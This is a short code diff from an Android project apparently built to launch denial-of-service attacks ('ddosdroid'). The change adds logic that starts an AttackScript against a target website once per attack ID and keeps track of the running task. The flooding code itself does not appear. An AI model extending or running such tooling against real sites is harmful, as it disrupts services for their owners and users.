@@ -15,6 +15,8 @@ import java.util.concurrent.TimeUnit;
 import gr.kalymnos.sk3m3l10.ddosdroid.pojos.Attack;
 import gr.kalymnos.sk3m3l10.ddosdroid.pojos.AttackConstants;
 
+import static gr.kalymnos.sk3m3l10.ddosdroid.utils.ValidationUtils.mapHasItems;
+
 public class AttackService extends Service {
     private static final String TAG = "AttackService";
 
@@ -51,7 +53,11 @@ public class AttackService extends Service {
     }
 
     private void handleStartAction(Attack attack) {
-
+        boolean firstTimeExecutingAttack = !mapHasItems(tasks) || !tasks.containsKey(attack.getPushId());
+        if (firstTimeExecutingAttack) {
+            Future future = executor.submit(new AttackScript(attack.getWebsite()));
+            tasks.put(attack.getPushId(), future);
+        }
     }
 
     private void handleStopAttack(Attack attack) {
